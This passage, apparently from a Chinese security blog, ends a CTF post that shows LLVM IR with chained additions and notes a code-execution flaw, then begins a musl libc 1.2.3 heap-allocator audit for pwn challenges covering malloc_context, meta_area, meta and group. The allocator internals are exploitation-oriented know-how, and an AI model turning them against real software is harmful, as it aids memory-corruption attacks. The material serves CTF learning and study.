nsw i64 %9, 16999840169020852552</span><br><span class="line">  %11 = add nsw i64 %10, 16999839548121314152</span><br><span class="line">  %12 = add nsw i64 %11, 16999840169015178801</span><br><span class="line">  %13 = add nsw i64 %12, 16999840169015152726</span><br><span class="line">  %14 = add nsw i64 %13, 16999840169015117930</span><br><span class="line">  %15 = add nsw i64 %14, 16999840169015152734</span><br><span class="line">  %16 = add nsw i64 %15, 16999840169020752200</span><br><span class="line">  %17 = add nsw i64 %16, 16999840169015152726</span><br><span class="line">  %18 = add nsw i64 %17, 16999840169020787016</span><br><span class="line">  %19 = add nsw i64 %18, 16999840169015169585</span><br><span class="line">  %20 = add nsw i64 %19, 16999840169015130986</span><br><span class="line">  %21 = add nsw i64 %20, 16999840169015152728</span><br><span class="line">  %22 = add nsw i64 %21, 16999840169015117071</span><br><span class="line">  %23 = add nsw i64 %22, 256</span><br><span class="line">  %24 = add nsw i64 %23, 256</span><br><span class="line">  %25 = add nsw i64 %24, 256</span><br><span class="line">  %26 = add nsw i64 %25, 256</span><br><span class="line">  %27 = add nsw i64 %26, 256</span><br><span class="line">  %28 = add nsw i64 %27, 256</span><br><span class="line">  %29 = add nsw i64 %28, 256</span><br><span class="line">  %30 = add nsw i64 %29, 256</span><br><span class="line">  %31 = add nsw i64 %30, 256</span><br><span class="line">  %32 = add nsw i64 %31, 256</span><br><span class="line">  %33 = add nsw i64 %32, 256</span><br><span class="line">  %34 = add nsw i64 %33, 256</span><br><span class="line">  %35 = add nsw i64 %34, 256</span><br><span class="line">  %36 = add nsw i64 %35, 256</span><br><span class="line">  %37 = add nsw i64 %36, 256</span><br><span class="line">  %38 = add nsw i64 %37, 256</span><br><span class="line">  %39 = add nsw i64 %38, 256</span><br><span class="line">  %40 = add nsw i64 %39, 256</span><br><span class="line">  %41 = add nsw i64 %40, 256</span><br><span class="line">  %42 = add nsw i64 %41, 256</span><br><span class="line">  %43 = add nsw i64 %42, 256</span><br><span class="line">  %44 = add nsw i64 %43, 256</span><br><span class="line">  %45 = add nsw i64 %44, 256</span><br><span class="line">  %46 = add nsw i64 %45, 256</span><br><span class="line">  %47 = add nsw i64 %46, 256</span><br><span class="line">  %48 = add nsw i64 %47, 256</span><br><span class="line">  %49 = add nsw i64 %48, 256</span><br><span class="line">  %50 = add nsw i64 %49, 256</span><br><span class="line">  %51 = add nsw i64 %50, 256</span><br><span class="line">  %52 = add nsw i64 %51, 256</span><br><span class="line">  %53 = add nsw i64 %52, 256</span><br><span class="line">  %54 = add nsw i64 %53, 256</span><br><span class="line">  %55 = add nsw i64 %54, 256</span><br><span class="line">  %56 = add nsw i64 %55, 256</span><br><span class="line">  %57 = add nsw i64 %56, 256</span><br><span class="line">  %58 = add nsw i64 %57, 256</span><br><span class="line">  %59 = add nsw i64 %58, 256</span><br><span class="line">  %60 = add nsw i64 %59, 256</span><br><span class="line">  %61 = add nsw i64 %60, 256</span><br><span class="line">  %62 = add nsw i64 %61, 256</span><br><span class="line">  %63 = add nsw i64 %62, 256</span><br><span class="line">  %64 = add nsw i64 %63, 256</span><br><span class="line">  %65 = add nsw i64 %64, 256</span><br><span class="line">  %66 = add nsw i64 %65, 256</span><br><span class="line">  %67 = add nsw i64 %66, 256</span><br><span class="line">  %68 = add nsw i64 %67, 256</span><br><span class="line">  %69 = add nsw i64 %68, 256</span><br><span class="line">  %70 = add nsw i64 %69, 256</span><br><span class="line">  %71 = add nsw i64 %70, 256</span><br><span class="line">  %72 = add nsw i64 %71, 256</span><br><span class="line">  %73 = add nsw i64 %72, 256</span><br><span class="line">  %74 = add nsw i64 %73, 256</span><br><span class="line">  %75 = add nsw i64 %74, 256</span><br><span class="line">  %76 = add nsw i64 %75, 256</span><br><span class="line">  %77 = add nsw i64 %76, 256</span><br><span class="line">  %78 = add nsw i64 %77, 256</span><br><span class="line">  %79 = add nsw i64 %78, 256</span><br><span class="line">  %80 = add nsw i64 %79, 256</span><br><span class="line">  %81 = add nsw i64 %80, 256</span><br><span class="line">  %82 = add nsw i64 %81, 256</span><br><span class="line">  %83 = add nsw i64 %82, 256</span><br><span class="line">  %84 = add nsw i64 %83, 256</span><br><span class="line">  %85 = add nsw i64 %84, 256</span><br><span class="line">  %86 = add nsw i64 %85, 256</span><br><span class="line">  %87 = add nsw i64 %86, 256</span><br><span class="line">  %88 = add nsw i64 %87, 256</span><br><span class="line">  %89 = add nsw i64 %88, 256</span><br><span class="line">  %90 = add nsw i64 %89, 256</span><br><span class="line">  %91 = add nsw i64 %90, 256</span><br><span class="line">  %92 = add nsw i64 %91, 256</span><br><span class="line">  %93 = add nsw i64 %92, 256</span><br><span class="line">  %94 = add nsw i64 %93, 256</span><br><span class="line">  %95 = add nsw i64 %94, 256</span><br><span class="line">  %96 = add nsw i64 %95, 256</span><br><span class="line">  %97 = add nsw i64 %96, 256</span><br><span class="line">  %98 = add nsw i64 %97, 256</span><br><span class="line">  %99 = add nsw i64 %98, 256</span><br><span class="line">  %100 = add nsw i64 %99, 256</span><br><span class="line">  %101 = add nsw i64 %100, 256</span><br><span class="line">  %102 = add nsw i64 %101, 256</span><br><span class="line">  %103 = add nsw i64 %102, 256</span><br><span class="line">  %104 = add nsw i64 %103, 256</span><br><span class="line">  %105 = add nsw i64 %104, 256</span><br><span class="line">  %106 = add nsw i64 %105, 256</span><br><span class="line">  %107 = add nsw i64 %106, 256</span><br><span class="line">  %108 = add nsw i64 %107, 256</span><br><span class="line">  %109 = add nsw i64 %108, 256</span><br><span class="line">  %110 = add nsw i64 %109, 256</span><br><span class="line">  %111 = add nsw i64 %110, 256</span><br><span class="line">  %112 = add nsw i64 %111, 256</span><br><span class="line">  %113 = add nsw i64 %112, 256</span><br><span class="line">  %114 = add nsw i64 %113, 256</span><br><span class="line">  %115 = add nsw i64 %114, 256</span><br><span class="line">  %116 = add nsw i64 %115, 256</span><br><span class="line">  %117 = add nsw i64 %116, 256</span><br><span class="line">  %118 = add nsw i64 %117, 256</span><br><span class="line">  %119 = add nsw i64 %118, 256</span><br><span class="line">  %120 = add nsw i64 %119, 256</span><br><span class="line">  %121 = add nsw i64 %120, 256</span><br><span class="line">  %122 = add nsw i64 %121, 256</span><br><span class="line">  %123 = add nsw i64 %122, 256</span><br><span class="line">  %124 = add nsw i64 %123, 256</span><br><span class="line">  %125 = add nsw i64 %124, 256</span><br><span class="line">  %126 = add nsw i64 %125, 256</span><br><span class="line">  %127 = add nsw i64 %126, 256</span><br><span class="line">  %128 = add nsw i64 %127, 256</span><br><span class="line">  %129 = add nsw i64 %128, 256</span><br><span class="line">  %130 = add nsw i64 %129, 256</span><br><span class="line">  %131 = add nsw i64 %130, 256</span><br><span class="line">  %132 = add nsw i64 %131, 256</span><br><span class="line">  %133 = add nsw i64 %132, 256</span><br><span class="line">  %134 = add nsw i64 %133, 256</span><br><span class="line">  %135 = add nsw i64 %134, 256</span><br><span class="line">  %136 = add nsw i64 %135, 256</span><br><span class="line">  %137 = add nsw i64 %136, 256</span><br><span class="line">  %138 = add nsw i64 %137, 256</span><br><span class="line">  %139 = add nsw i64 %138, 256</span><br><span class="line">  %140 = add nsw i64 %139, 256</span><br><span class="line">  %141 = add nsw i64 %140, 256</span><br><span class="line">  %142 = add nsw i64 %141, 256</span><br><span class="line">  %143 = add nsw i64 %142, 256</span><br><span class="line">  %144 = add nsw i64 %143, 256</span><br><span class="line">  %145 = add nsw i64 %144, 256</span><br><span class="line">  %146 = add nsw i64 %145, 256</span><br><span class="line">  %147 = add nsw i64 %146, 256</span><br><span class="line">  %148 = add nsw i64 %147, 256</span><br><span class="line">  %149 = add nsw i64 %148, 256</span><br><span class="line">  %150 = add nsw i64 %149, 256</span><br><span class="line">  %151 = add nsw i64 %150, 256</span><br><span class="line">  %152 = add nsw i64 %151, 256</span><br><span class="line">  %153 = add nsw i64 %152, 256</span><br><span class="line">  %154 = add nsw i64 %153, 256</span><br><span class="line">  %155 = add nsw i64 %154, 256</span><br><span class="line">  %156 = add nsw i64 %155, 256</span><br><span class="line">  %157 = add nsw i64 %156, 256</span><br><span class="line">  %158 = add nsw i64 %157, 256</span><br><span class="line">  %159 = add nsw i64 %158, 256</span><br><span class="line">  %160 = add nsw i64 %159, 256</span><br><span class="line">  %161 = add nsw i64 %160, 256</span><br><span class="line">  %162 = add nsw i64 %161, 256</span><br><span class="line">  %163 = add nsw i64 %162, 256</span><br><span class="line">  %164 = add nsw i64 %163, 256</span><br><span class="line">  %165 = add nsw i64 %164, 256</span><br><span class="line">  %166 = add nsw i64 %165, 256</span><br><span class="line">  %167 = add nsw i64 %166, 256</span><br><span class="line">  %168 = add nsw i64 %167, 256</span><br><span class="line">  %169 = add nsw i64 %168, 256</span><br><span class="line">  %170 = add nsw i64 %169, 256</span><br><span class="line">  %171 = add nsw i64 %170, 256</span><br><span class="line">  %172 = add nsw i64 %171, 256</span><br><span class="line">  %173 = add nsw i64 %172, 256</span><br><span class="line">  %174 = add nsw i64 %173, 256</span><br><span class="line">  %175 = add nsw i64 %174, 256</span><br><span class="line">  %176 = add nsw i64 %175, 256</span><br><span class="line">  %177 = add nsw i64 %176, 256</span><br><span class="line">  %178 = add nsw i64 %177, 256</span><br><span class="line">  %179 = add nsw i64 %178, 256</span><br><span class="line">  %180 = add nsw i64 %179, 256</span><br><span class="line">  %181 = add nsw i64 %180, 256</span><br><span class="line">  %182 = add nsw i64 %181, 256</span><br><span class="line">  %183 = add nsw i64 %182, 256</span><br><span class="line">  %184 = add nsw i64 %183, 256</span><br><span class="line">  %185 = add nsw i64 %184, 256</span><br><span class="line">  %186 = add nsw i64 %185, 256</span><br><span class="line">  %187 = add nsw i64 %186, 256</span><br><span class="line">  %188 = add nsw i64 %187, 256</span><br><span class="line">  %189 = add nsw i64 %188, 256</span><br><span class="line">  %190 = add nsw i64 %189, 256</span><br><span class="line">  %191 = add nsw i64 %190, 256</span><br><span class="line">  %192 = add nsw i64 %191, 256</span><br><span class="line">  %193 = add nsw i64 %192, 256</span><br><span class="line">  %194 = add nsw i64 %193, 256</span><br><span class="line">  %195 = add nsw i64 %194, 256</span><br><span class="line">  %196 = add nsw i64 %195, 256</span><br><span class="line">  %197 = add nsw i64 %196, 256</span><br><span class="line">  %198 = add nsw i64 %197, 256</span><br><span class="line">  %199 = add nsw i64 %198, 256</span><br><span class="line">  %200 = add nsw i64 %199, 256</span><br><span class="line">  %201 = add nsw i64 %200, 256</span><br><span class="line">  %202 = add nsw i64 %201, 256</span><br><span class="line">  %203 = add nsw i64 %202, 256</span><br><span class="line">  %204 = add nsw i64 %203, 256</span><br><span class="line">  %205 = add nsw i64 %204, 256</span><br><span class="line">  %206 = add nsw i64 %205, 256</span><br><span class="line">  %207 = add nsw i64 %206, 256</span><br><span class="line">  %208 = add nsw i64 %207, 256</span><br><span class="line">  %209 = add nsw i64 %208, 256</span><br><span class="line">  %210 = add nsw i64 %209, 256</span><br><span class="line">  %211 = add nsw i64 %210, 256</span><br><span class="line">  %212 = add nsw i64 %211, 256</span><br><span class="line">  %213 = add nsw i64 %212, 256</span><br><span class="line">  %214 = add nsw i64 %213, 256</span><br><span class="line">  %215 = add nsw i64 %214, 256</span><br><span class="line">  %216 = add nsw i64 %215, 256</span><br><span class="line">  %217 = add nsw i64 %216, 256</span><br><span class="line">  %218 = add nsw i64 %217, 256</span><br><span class="line">  %219 = add nsw i64 %218, 256</span><br><span class="line">  %220 = add nsw i64 %219, 256</span><br><span class="line">  %221 = add nsw i64 %220, 256</span><br><span class="line">  %222 = add nsw i64 %221, 256</span><br><span class="line">  %223 = add nsw i64 %222, 256</span><br><span class="line">  %224 = add nsw i64 %223, 256</span><br><span class="line">  %225 = add nsw i64 %224, 256</span><br><span class="line">  %226 = add nsw i64 %225, 256</span><br><span class="line">  %227 = add nsw i64 %226, 256</span><br><span class="line">  %228 = add nsw i64 %227, 256</span><br><span class="line">  %229 = add nsw i64 %228, 256</span><br><span class="line">  %230 = add nsw i64 %229, 256</span><br><span class="line">  %231 = add nsw i64 %230, 256</span><br><span class="line">  %232 = add nsw i64 %231, 256</span><br><span class="line">  %233 = add nsw i64 %232, 256</span><br><span class="line">  %234 = add nsw i64 %233, 256</span><br><span class="line">  %235 = add nsw i64 %234, 256</span><br><span class="line">  %236 = add nsw i64 %235, 256</span><br><span class="line">  %237 = add nsw i64 %236, 256</span><br><span class="line">  %238 = add nsw i64 %237, 256</span><br><span class="line">  %239 = add nsw i64 %238, 256</span><br><span class="line">  %240 = add nsw i64 %239, 256</span><br><span class="line">  %241 = add nsw i64 %240, 256</span><br><span class="line">  %242 = add nsw i64 %241, 256</span><br><span class="line">  %243 = add nsw i64 %242, 256</span><br><span class="line">  %244 = add nsw i64 %243, 256</span><br><span class="line">  %245 = add nsw i64 %244, 256</span><br><span class="line">  %246 = add nsw i64 %245, 256</span><br><span class="line">  %247 = add nsw i64 %246, 256</span><br><span class="line">  %248 = add nsw i64 %247, 256</span><br><span class="line">  %249 = add nsw i64 %248, 256</span><br><span class="line">  %250 = add nsw i64 %249, 256</span><br><span class="line">  %251 = add nsw i64 %250, 256</span><br><span class="line">  %252 = add nsw i64 %251, 256</span><br><span class="line">  %253 = add nsw i64 %252, 256</span><br><span class="line">  %254 = add nsw i64 %253, 256</span><br><span class="line">  %255 = add nsw i64 %254, 256</span><br><span class="line">  %256 = add nsw i64 %255, 256</span><br><span class="line">  %257 = add nsw i64 %256, 256</span><br><span class="line">  %258 = add nsw i64 %257, 256</span><br><span class="line">  %259 = add nsw i64 %258, 256</span><br><span class="line">  %260 = add nsw i64 %259, 256</span><br><span class="line">  %261 = add nsw i64 %260, 256</span><br><span class="line">  %262 = add nsw i64 %261, 256</span><br><span class="line">  %263 = add nsw i64 %262, 256</span><br><span class="line">  %264 = add nsw i64 %263, 256</span><br><span class="line">  %265 = add nsw i64 %264, 256</span><br><span class="line">  %266 = add nsw i64 %265, 256</span><br><span class="line">  %267 = add nsw i64 %266, 256</span><br><span class="line">  %268 = add nsw i64 %267, 256</span><br><span class="line">  %269 = add nsw i64 %268, 256</span><br><span class="line">  %270 = add nsw i64 %269, 256</span><br><span class="line">  %271 = add nsw i64 %270, 256</span><br><span class="line">  %272 = add nsw i64 %271, 256</span><br><span class="line">  %273 = add nsw i64 %272, 256</span><br><span class="line">  %274 = add nsw i64 %273, 256</span><br><span class="line">  %275 = add nsw i64 %274, 256</span><br><span class="line">  %276 = add nsw i64 %275, 256</span><br><span class="line">  %277 = add nsw i64 %276, 256</span><br><span class="line">  %278 = add nsw i64 %277, 256</span><br><span class="line">  %279 = add nsw i64 %278, 256</span><br><span class="line">  %280 = add nsw i64 %279, 256</span><br><span class="line">  %281 = add nsw i64 %280, 256</span><br><span class="line">  %282 = add nsw i64 %281, 256</span><br><span class="line">  %283 = add nsw i64 %282, 256</span><br><span class="line">  %284 = add nsw i64 %283, 256</span><br><span class="line">  %285 = add nsw i64 %284, 256</span><br><span class="line">  %286 = add nsw i64 %285, 256</span><br><span class="line">  %287 = add nsw i64 %286, 256</span><br><span class="line">  %288 = add nsw i64 %287, 256</span><br><span class="line">  %289 = add nsw i64 %288, 256</span><br><span class="line">  %290 = add nsw i64 %289, 256</span><br><span class="line">  %291 = add nsw i64 %290, 256</span><br><span class="line">  %292 = add nsw i64 %291, 256</span><br><span class="line">  %293 = add nsw i64 %292, 256</span><br><span class="line">  %294 = add nsw i64 %293, 256</span><br><span class="line">  %295 = add nsw i64 %294, 256</span><br><span class="line">  %296 = add nsw i64 %295, 256</span><br><span class="line">  %297 = add nsw i64 %296, 256</span><br><span class="line">  %298 = add nsw i64 %297, 256</span><br><span class="line">  %299 = add nsw i64 %298, 256</span><br><span class="line">  %300 = add nsw i64 %299, 256</span><br><span class="line">  %301 = add nsw i64 %300, 256</span><br><span class="line">  %302 = add nsw i64 %301, 256</span><br><span class="line">  %303 = add nsw i64 %302, 256</span><br><span class="line">  %304 = add nsw i64 %303, 256</span><br><span class="line">  %305 = add nsw i64 %304, 256</span><br><span class="line">  %306 = add nsw i64 %305, 256</span><br><span class="line">  %307 = add nsw i64 %306, 256</span><br><span class="line">  %308 = add nsw i64 %307, 256</span><br><span class="line">  %309 = add nsw i64 %308, 256</span><br><span class="line">  %310 = add nsw i64 %309, 256</span><br><span class="line">  %311 = add nsw i64 %310, 256</span><br><span class="line">  %312 = add nsw i64 %311, 256</span><br><span class="line">  %313 = add nsw i64 %312, 256</span><br><span class="line">  %314 = add nsw i64 %313, 1</span><br><span class="line">  %315 = add nsw i64 %314, 1</span><br><span class="line">  %316 = add nsw i64 %315, 1</span><br><span class="line">  %317 = add nsw i64 %316, 256</span><br><span class="line">  %318 = add nsw i64 %317, 256</span><br><span class="line">  %319 = add nsw i64 %318, 256</span><br><span class="line">  ret i64 %319</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;Ubuntu clang version 12.0.0-3ubuntu1~20.04.5&quot;&#125;</span><br></pre></td></tr></table></figure><p>本题的漏洞点在于代码执行。在做题的时候，要特别注意动态代码执行部分，这个部分往往就是漏洞产生的地方。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>musl pwn 入门 (1)</title>
      <link href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-1/"/>
      <url>/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-1/</url>
      
        <content type="html"><![CDATA[<p>近年来，musl libc作为一个轻量级的libc越来越多地出现在CTF pwn题之中，其和glibc相比有一定的差距，因此本文我们就musl libc最常考的考点——内存分配，进行musl libc的源代码审计。</p><p>不同于glibc多达四五千行代码，大小超过10w字节的malloc.c，musl libc中的malloc.c大小甚至都不到1w字节，其轻量级的特性也使得我们更加容易去阅读它的代码。</p><p>musl libc在内存分配上经历过一次大的改动（1.2.0-&gt;1.2.1），本文针对发文时的最新版本1.2.3进行分析。</p><p>参考文章：<a href="https://bbs.kanxue.com/thread-269533.htm#msg_header_h3_6">传送门</a></p><h1 id="1-主要数据结构"><a href="#1-主要数据结构" class="headerlink" title="1. 主要数据结构"></a>1. 主要数据结构</h1><h2 id="malloc-context"><a href="#malloc-context" class="headerlink" title="malloc_context"></a>malloc_context</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> secret;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line"><span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> init_done;</span><br><span class="line"><span class="type">unsigned</span> mmap_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line"><span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line"><span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line"><span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line"><span class="type">uint8_t</span> seq;</span><br><span class="line"><span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构体是musl libc的堆管理最上层结构，其中字段的含义分别为：</p><ul><li><code>uint64_t secret</code>：一个随机生成的数，用于检查<code>meta</code>的合法性，也即一个check guard</li><li><code>size_t pagesize</code>：页大小，在x86_64下一般为为0x1000</li><li><code>int init_done</code>：判断<code>malloc_context</code>是否初始化完成，在<code>alloc_meta</code>函数中进行检查，如果没有则进行初始化，否则跳过初始化流程</li><li><code>unsigned mmap_counter</code>：mmap计数器，通过mmap分配了多少次空间用于内存分配</li><li><code>struct meta *free_meta_head</code>：被释放的<code>meta</code>结构体构成的链表表头，<code>meta</code>结构体是musl libc内存分配的低一级结构，后面会提到</li><li><code>struct meta *avail_meta</code>：空闲的<code>meta</code>结构体构成的链表表头</li><li><code>size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift</code>：<ul><li><code>size_t avail_meta_count</code>：空闲<code>meta</code>的数量</li><li><code>size_t avail_meta_area_count</code>：空闲<code>meta_area</code>的数量，<code>meta_area</code>是<code>meta</code>的控制结构</li><li><code>size_t meta_alloc_shift</code>：&lt;暂缺&gt;</li></ul></li><li><code>struct meta_area *meta_area_head, *meta_area_tail</code>：<code>meta_area</code>链表表头，链表表尾</li><li><code>unsigned char *avail_meta_areas</code>：&lt;暂缺&gt;</li><li><code>struct meta *active[48]</code>：可以继续分配的<code>meta</code></li><li><code>size_t usage_by_class[48]</code>：对应大小的缓存的所有<code>meta</code>的<code>group</code>所管理的chunk个数</li><li><code>uint8_t unmap_seq[32], bounces[32]</code>：&lt;暂缺&gt;</li><li><code>uint8_t seq</code>：&lt;暂缺&gt;</li><li><code>uintptr_t brk</code>：记录目前的<code>brk(0)</code></li></ul><p>其中有一些字段无法通过简单查看代码得到，需要进一步代码审计获取其含义，我们后面再进行补充。</p><h2 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area"></a>meta_area</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> check;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">int</span> nslots;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构用于管理一页内的所有<code>meta</code>结构，属于<code>malloc_context</code>的下级结构，<code>meta</code>的上级结构。</p><ul><li><code>uint64_t check</code>：检查字段，与<code>malloc_context</code>中的<code>secret</code>字段对应，检查该<code>meta_area</code>是否可能被修改</li><li><code>struct meta_area *next</code>：下一个<code>meta_area</code>的地址，构成链表</li><li><code>int nslots</code>：该<code>meta_area</code>中管理的<code>meta</code>数量，一般为固定值</li><li><code>struct meta slots[]</code>：管理的<code>meta</code>数组</li></ul><h2 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line"><span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line"><span class="type">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line"><span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line"><span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>meta</code>中保存有<code>group</code>结构体指针，后者直接保存有需要分配的内存块。即<code>meta</code>和其管理的内存块可能不在同一个page中。</p><ul><li><code>struct meta *prev, *next</code>：前后<code>meta</code>，构成双向链表</li><li><code>struct group *mem</code>：管理的<code>group</code>结构体指针</li><li><code>volatile int avail_mask, freed_mask</code>：掩码的形式，用一个bit表示存在与否</li><li><code>uintptr_t last_idx:5</code>：该<code>meta</code>中最后一个chunk的索引</li><li><code>freeable:1</code>：该<code>meta</code>中的chunk是否能够被释放</li><li><code>uintptr_t sizeclass:6</code>：管理的group的大小。如果mem是mmap分配，固定为63</li><li><code>uintptr_t maplen:8*sizeof(uintptr_t)-12</code>：如果管理的group是mmap分配的，则为内存页数，否则为0</li></ul><h2 id="group"><a href="#group" class="headerlink" title="group"></a>group</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line"><span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>group</code>中即保存有需要分配出去的chunk。</p><ul><li><code>struct meta *meta</code>：所属的<code>meta</code>的地址</li><li><code>unsigned char active_idx:5</code>：5个比特，表示还有多少可用chunk</li><li><code>char pad[UNIT - sizeof(struct meta *) - 1]</code>：手动16字节对齐</li><li><code>unsigned char storage[]</code>：要分配出去的内存空间，chunk</li></ul><hr><p>以上就是musl libc中主要的数据结构，下面我们通过代码审计彻底搞清楚musl libc的内存分配机制。</p><h1 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2. 代码审计"></a>2. 代码审计</h1><p>我们首先从内存分配相关的函数开始看起。对于辅助性的较为复杂的函数使用小标题的形式进行分析，辅助性的较为简单的函数只在第一次出现时直接写到主要函数分析代码中进行简单解释。</p><h2 id="malloc（-src-malloc-mallocng-malloc-c-line-299）"><a href="#malloc（-src-malloc-mallocng-malloc-c-line-299）" class="headerlink" title="malloc（/src/malloc/mallocng/malloc.c line 299）"></a>malloc（<code>/src/malloc/mallocng/malloc.c line 299</code>）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 